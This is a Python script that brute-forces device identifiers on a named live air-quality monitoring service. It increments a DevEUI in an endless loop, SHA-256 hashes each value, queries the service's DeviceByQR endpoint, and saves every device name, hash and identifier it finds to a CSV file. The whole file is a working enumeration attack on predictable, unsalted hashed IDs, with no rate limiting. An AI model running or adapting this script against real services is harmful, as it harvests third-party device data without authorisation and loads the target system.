from concurrent.futures import ThreadPoolExecutor
import logging
import os
import signal
import requests
from bs4 import BeautifulSoup
import csv
from datetime import datetime
import hashlib
import sys


logger = logging.getLogger(__name__)
URL = "https://education.thingsflow.eu/IAQ/DeviceByQR"


def hash_hex_string(hex_string):
    byte_string = hex_string.encode("utf-8")
    sha256_hash = hashlib.sha256()
    sha256_hash.update(byte_string)
    hashed_hex = sha256_hash.hexdigest()

    return hashed_hex


def test_url(writer, deveui):
    hashedname = hash_hex_string(deveui)
    query = {"hashedname": hashedname}
    r = requests.post(URL, params=query)
    soup = BeautifulSoup(r.content, "html5lib")

    title = soup.find("h1").text.replace("Show Device ", "")
    if not title.count("Error"):
        writer.writerow([title, hashedname, deveui])
    logger.info(f"{title} | {hashedname} | {deveui}")


def device_find():
    # patient zero
    # deveui = "A81758FFFE056D68"
    deveui = "A81758FFFE000000"
    # hashedname = hash_hex_string(deveui)

    current_datetime = datetime.now()
    formatted_datetime = current_datetime.strftime("%Y-%m-%d_%H-%M-%S")

    if not os.path.exists("csv"):
        os.makedirs("csv")
    filename = f"./csv/{formatted_datetime}.csv"
    file = open(filename, mode="w", newline="")
    writer = csv.writer(file)
    writer.writerow(["name", "hashedname", "deveui"])
    print(f"New CSV file '{filename}' has been created.")

    # with ThreadPoolExecutor(max_workers=1) as executor:
    while True:
        deveui = str(hex(int(deveui, 16) + 1))[2:].upper()
        test_url(writer, deveui)
